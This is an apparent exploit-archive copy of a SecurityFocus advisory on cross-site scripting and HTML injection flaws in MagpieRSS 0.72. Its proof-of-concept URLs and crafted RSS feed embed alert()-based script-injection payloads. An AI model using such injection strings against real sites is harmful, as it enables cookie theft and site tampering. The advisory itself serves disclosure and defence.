@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/34891/info
+
+MagpieRSS is prone to multiple cross-site scripting issues and an HTML-injection issue because it fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+MagpieRSS 0.72 is vulnerable; other versions may also be affected.
+
+http://www.example.com/magpierss-0.72/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert(%27xss%27);%3C/script http://www.example.com/magpierss-0.72/scripts/magpie_simple.php?url=%22%3E%3Cscript%3Ealert(%27xss%27);%3C/script <?xml version="1.0" encoding="utf-8"?> <rss version="2.0" xml:base="http://www.example.com" xmlns:dc="http://purl.org/dc/elements/1.1/"> <channel> <title>Justin.MadIrish.net <script>alert('xss title');</script>- Justin&#039;s Personal Homepage</title> <link>http://www.example.com</link> <description>Close personal friends with Evil Eve.</description> <language>en</language> <item> <title>Disturbing<script>alert('xss title');</script> XSS<script>alert('xss title');</script></title> <link>http://www.example.com/node/343 <script>alert('xss link');</script></link> <description>foobar</description> <pubDate>Wed, 04 Mar 2009 13:42:09 +0000</pubDate> <dc:creator>justin</dc:creator> <guid isPermaLink="false">343 at http://www.example.com</guid> </item> </channel> </rss> 
